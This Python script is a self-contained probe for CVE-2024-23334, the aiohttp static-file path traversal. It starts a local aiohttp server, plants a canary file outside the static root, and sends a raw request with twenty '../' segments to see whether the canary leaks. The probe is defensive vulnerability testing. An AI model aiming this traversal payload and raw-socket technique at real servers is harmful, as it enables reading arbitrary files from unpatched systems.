#!/usr/bin/env python3
"""
Active exploit probe for CVE-2024-23334 (aiohttp static-file path traversal).

aiohttp < 3.9.2, when a static route is registered with follow_symlinks=True,
fails to confine requests to the static root, so a raw (unnormalized) request
path containing ../ escapes it and reads arbitrary files.

This does NOT just read the version — it stands up a real aiohttp static server
inside whatever interpreter runs it, drops a canary file OUTSIDE the static
root, and sends a raw traversal request. If the canary comes back, the running
aiohttp is actually vulnerable.

Exit codes:  0 = vulnerable (canary leaked)   1 = blocked (patched)   2 = error
"""
import asyncio
import os
import socket
import sys

try:
    import aiohttp
    from aiohttp import web
except Exception as e:  # pragma: no cover
    print(f"ERROR: aiohttp not importable: {e}")
    sys.exit(2)

STATIC_ROOT = "/tmp/cve_probe_static"
SECRET = "/tmp/cve_probe_secret.txt"
CANARY = "TOP-SECRET-CANARY"
PORT = 8099


def raw_get(host, port, raw_path):
    # send the path verbatim; an HTTP client would collapse the ../ segments
    s = socket.create_connection((host, port), timeout=5)
    s.sendall(
        f"GET {raw_path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
    )
    chunks = []
    while True:
        b = s.recv(4096)
        if not b:
            break
        chunks.append(b)
    s.close()
    return b"".join(chunks).decode("latin-1")


async def main():
    os.makedirs(STATIC_ROOT, exist_ok=True)
    with open(SECRET, "w") as f:
        f.write(CANARY + "\n")
    with open(os.path.join(STATIC_ROOT, "ok.txt"), "w") as f:
        f.write("public\n")

    app = web.Application()
    app.router.add_static("/static/", STATIC_ROOT, follow_symlinks=True)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", PORT)
    await site.start()

    payload = "/static/" + "../" * 20 + SECRET.lstrip("/")
    loop = asyncio.get_running_loop()
    try:
        resp = await loop.run_in_executor(None, raw_get, "127.0.0.1", PORT, payload)
    finally:
        await runner.cleanup()

    status = resp.split("\r\n", 1)[0]
    leaked = (" 200 " in status) and (CANARY in resp)
    print(f"aiohttp {aiohttp.__version__}  request={payload}")
    print(f"server responded: {status.strip()}")
    if leaked:
        print(f"VULNERABLE: traversal escaped the static root and leaked {SECRET}")
        return 0
    print("BLOCKED: traversal rejected, canary not leaked (patched)")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except SystemExit:
        raise
    except Exception as e:
        print(f"ERROR: probe failed to run: {e}")
        sys.exit(2)
